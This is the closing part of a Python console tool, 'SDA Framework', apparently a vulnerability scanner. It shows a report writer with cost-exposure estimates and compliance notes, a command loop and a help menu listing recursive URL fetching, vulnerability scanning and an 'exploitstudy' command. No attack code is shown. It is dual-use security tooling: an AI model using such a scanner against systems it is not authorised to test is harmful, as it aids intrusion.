                3: (10000, 100000, 0.7),
                2: (1000, 10000, 0.8),
                1: (0, 1000, 0.9)
            }

            total_exposure = 0
            for severity in range(5, 0, -1):
                count = severity_counts[severity]
                if count > 0:
                    min_cost, max_cost, likelihood = exposure_estimates[severity]
                    avg_cost = (min_cost + max_cost) / 2
                    exposure = avg_cost * likelihood * count
                    total_exposure += exposure
                    f.write(f"| {severity} | ${min_cost:,} - ${max_cost:,} | {likelihood*100:.0f}% | ${exposure:,.0f} |\n")

            f.write(f"| **Total** | | | **${total_exposure:,.0f}** |\n")

            f.write("\n## 6. Compliance Considerations\n")
            f.write("- **GDPR:** Potential fines up to €20 million or 4% of global turnover\n")
            f.write("- **HIPAA:** Fines up to $1.5 million per violation category per year\n")
            f.write("- **PCI DSS:** Fines up to $100,000 per month for non-compliance\n")
            f.write("- **SOX:** Criminal penalties including imprisonment\n")

            f.write("\n## 7. Recommendations\n")
            f.write("1. Implement a Web Application Firewall (WAF)\n")
            f.write("2. Conduct regular penetration testing\n")
            f.write("3. Implement security monitoring and logging\n")
            f.write("4. Establish incident response plan\n")
            f.write("5. Consider cyber insurance coverage\n")

        print(f"{Colors.GREEN}[+] Report generated: {report_file}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Opening report...{Colors.END}")

        try:
            with open(report_file, 'r', encoding='utf-8') as f:
                print(f.read())
        except Exception as e:
            print(f"{Colors.RED}[!] Error reading report: {e}{Colors.END}")

    def run(self):
        """Main interactive loop"""
        self.clear_screen()

        while True:
            print(f"\n{Colors.GREEN}{Colors.BOLD}SDA Framework >{Colors.END} ", end="")
            command = input().strip().lower()

            if command == 'exit' or command == 'quit':
                print(f"{Colors.YELLOW}[+] Exiting SDA Framework{Colors.END}")
                break

            elif command.startswith('fetch '):
                url = command[6:]
                self.fetch(url)

            elif command == 'recurzek':
                self.recurzek()

            elif command == 'encs':
                self.detect_encoders_encrypters()

            elif command == 'vulns':
                self.vulns()

            elif command == 'vulndetails':
                self.vulndetails()

            elif command == 'exploitstudy':
                self.exploitstudy()

            elif command == 'report':
                self.report()

            elif command == 'help' or command == '?':
                self._show_help()

            elif command == 'clear':
                self.clear_screen()

            else:
                print(f"{Colors.RED}[!] Unknown command. Type 'help' for available commands.{Colors.END}")

    def _show_help(self):
        """Show help menu"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}SDA FRAMEWORK COMMANDS:{Colors.END}")
        print(f"{Colors.GREEN}  fetch <url>       {Colors.YELLOW}Download URL recursively using wget{Colors.END}")
        print(f"{Colors.GREEN}  recurzek          {Colors.YELLOW}Read source codes and extract file types{Colors.END}")
        print(f"{Colors.GREEN}  encs              {Colors.YELLOW}Detect encoders, encrypters, security measures{Colors.END}")
        print(f"{Colors.GREEN}  vulns             {Colors.YELLOW}Scan for vulnerabilities{Colors.END}")
        print(f"{Colors.GREEN}  vulndetails       {Colors.YELLOW}Show detailed vulnerability information{Colors.END}")
        print(f"{Colors.GREEN}  exploitstudy      {Colors.YELLOW}Study exploitation techniques{Colors.END}")
        print(f"{Colors.GREEN}  report            {Colors.YELLOW}Generate comprehensive security report{Colors.END}")
        print(f"{Colors.GREEN}  clear             {Colors.YELLOW}Clear screen{Colors.END}")
        print(f"{Colors.GREEN}  help/?            {Colors.YELLOW}Show this help menu{Colors.END}")
        print(f"{Colors.GREEN}  exit/quit         {Colors.YELLOW}Exit the framework{Colors.END}")

def main():
    parser = argparse.ArgumentParser(description='SDA Framework - System Vulnerability Research and Fix Tool')
    parser.add_argument('path', nargs='?', default='.', help='Base path to analyze')
    args = parser.parse_args()

    framework = SDAFramework(args.path)
    framework.run()

if __name__ == "__main__":
    main()